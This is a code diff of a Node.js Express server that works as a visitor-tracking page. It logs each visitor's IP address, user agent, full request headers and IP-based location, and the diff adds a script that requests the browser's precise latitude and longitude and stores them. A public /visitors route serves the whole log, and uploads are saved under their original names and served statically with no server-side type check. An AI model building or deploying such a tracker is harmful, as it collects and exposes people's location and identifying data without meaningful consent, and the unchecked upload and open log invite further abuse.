@@ -1,36 +1,36 @@
 const express = require('express');
 const fs = require('fs');
 const fetch = require('node-fetch');
-const multer = require('multer'); // Import multer for file uploads
+const multer = require('multer');
 const app = express();
 const port = 3000;
 
 // Setup multer for file storage
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
-    cb(null, 'uploads/'); // Store files in the "uploads" folder
+    cb(null, 'uploads/');
   },
   filename: (req, file, cb) => {
-    cb(null, Date.now() + '-' + file.originalname); // Unique file name
+    cb(null, Date.now() + '-' + file.originalname);
   }
 });
-const upload = multer({ storage: storage }); // Initialize multer with storage settings
+const upload = multer({ storage: storage });
 
-// Middleware to serve static files (images, docs, etc.)
+// Middleware to serve static files
 app.use(express.static('public'));
-app.use(express.static('uploads')); // Serve the uploaded files
+app.use(express.static('uploads'));
 
-// Homepage with a form to upload an image
+// Homepage
 app.get('/', async (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const ip = ipRaw.split(',')[0].trim().replace('::ffff:', '');
+
   const userAgent = req.headers['user-agent'];
   const headers = JSON.stringify(req.headers, null, 2);
 
-  // Use ipapi.co (free, no API key required for basic info)
+  // Get location info using ipapi.co
   const geoUrl = `https://ipapi.co/${ip}/json/`;
 
-  let latitude = 'N/A';
-  let longitude = 'N/A';
   let city = 'N/A';
   let region = 'N/A';
   let country = 'N/A';
@@ -38,8 +38,6 @@ app.get('/', async (req, res) => {
   try {
     const response = await fetch(geoUrl);
     const geoData = await response.json();
-    latitude = geoData.latitude || 'N/A';
-    longitude = geoData.longitude || 'N/A';
     city = geoData.city || 'N/A';
     region = geoData.region || 'N/A';
     country = geoData.country_name || 'N/A';
@@ -47,60 +45,80 @@ app.get('/', async (req, res) => {
     console.error('❌ Error fetching geolocation:', err);
   }
 
-  // Log visitor info to visitors.txt
+  // Log basic visitor info
   const logData = `=========================
 New Visitor:
 Time: ${new Date().toISOString()}
 IP Address: ${ip}
 User-Agent: ${userAgent}
-Location: ${city}, ${region}, ${country}
-Latitude: ${latitude}
-Longitude: ${longitude}
+Location (IP-based): ${city}, ${region}, ${country}
 Headers: ${headers}
 =========================\n`;
 
   fs.appendFile('visitors.txt', logData, (err) => {
-    if (err) {
-      console.error('❌ Error saving visitor info:', err);
-    } else {
-      console.log('✅ Visitor info saved to visitors.txt');
-    }
+    if (err) console.error('❌ Error saving visitor info:', err);
+    else console.log('✅ Visitor info saved to visitors.txt');
   });
 
-  // Send response with location info, and links to documents/images/Youtube
+  // Send page
   res.send(`
-    🚀 Thanks for visiting! Your location: ${city}, ${region}, ${country}
+    <h1>🚀 Welcome!</h1>
+    <p>Your IP-based location: ${city}, ${region}, ${country}</p>
     
-    📄 Download our document: <a href="/files/sample-doc.pdf" target="_blank">Download PDF</a>
-    
-    🖼️ View our image: <a href="/images/sample-image.jpg" target="_blank">View Image</a>
-    
-    🎥 Check this YouTube video: <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">YouTube Video</a>
-    
+    <p>📄 <a href="/files/sample-doc.pdf" target="_blank">Download PDF</a></p>
+    <p>🖼️ <a href="/images/sample-image.jpg" target="_blank">View Image</a></p>
+    <p>🎥 <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">Watch YouTube Video</a></p>
+
     <h2>Upload an Image</h2>
     <form action="/upload" method="POST" enctype="multipart/form-data">
       <input type="file" name="image" accept="image/*" required />
-      <button type="submit">Upload Image</button>
+      <button type="submit">Upload</button>
     </form>
+
+    <script>
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          fetch(\`/log-location?lat=\${pos.coords.latitude}&lon=\${pos.coords.longitude}\`);
+        },
+        err => {
+          console.log("Geolocation error:", err);
+        }
+      );
+    </script>
   `);
 });
 
-// Endpoint to handle file upload
+// Log client browser geolocation
+app.get('/log-location', (req, res) => {
+  const lat = req.query.lat;
+  const lon = req.query.lon;
+  const logData = `Client-reported coordinates:
+Latitude: ${lat}
+Longitude: ${lon}
+=========================\n`;
+  fs.appendFile('visitors.txt', logData, (err) => {
+    if (err) console.error('❌ Error saving location:', err);
+    else console.log('✅ Client location saved');
+  });
+  res.send('Location logged!');
+});
+
+// Handle image upload
 app.post('/upload', upload.single('image'), (req, res) => {
-  if (!req.file) {
-    return res.status(400).send('No file uploaded');
-  }
+  if (!req.file) return res.status(400).send('No file uploaded');
   res.send(`
-    <h2>Image Uploaded Successfully</h2>
+    <h2>✅ Image Uploaded Successfully</h2>
     <p>File: <strong>${req.file.filename}</strong></p>
-    <img src="/uploads/${req.file.filename}" alt="Uploaded Image" width="300"/>
+    <img src="/${req.file.filename}" alt="Uploaded Image" width="300"/>
+    <p><a href="/">Back to Home</a></p>
   `);
 });
+
+// Show visitors log
 app.get('/visitors', (req, res) => {
   res.sendFile(__dirname + '/visitors.txt');
 });
 
-
 app.listen(port, () => {
-  console.log(`✅ Server running at http://localhost:${port}`);
+  console.log(`✅ Server running on http://localhost:${port}`);
 });
